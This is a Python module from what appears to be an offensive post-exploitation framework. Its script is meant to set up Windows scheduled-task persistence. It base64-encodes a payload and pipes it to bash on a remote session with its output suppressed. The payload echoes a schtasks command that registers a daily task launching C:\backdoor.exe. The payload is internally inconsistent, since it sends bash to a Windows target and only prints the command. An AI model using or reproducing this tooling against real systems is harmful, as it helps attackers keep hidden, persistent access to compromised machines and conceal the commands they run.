"""Windows scheduled task persistence."""
from ..base import OperatorScript, ScriptResult

class ScheduledTaskPersist(OperatorScript):
    name = "Scheduled Task Persistence"
    description = "Windows scheduled task persistence"
    category = "persist"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] WINDOWS SCHEDULED TASK PERSISTENCE"
echo "PowerShell: schtasks /create /tn Update /tr C:\\backdoor.exe /sc daily /st 09:00"
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Scheduled task persistence...[/bold cyan]")
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            return ScriptResult(success=True, output="Scheduled task info executed")
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
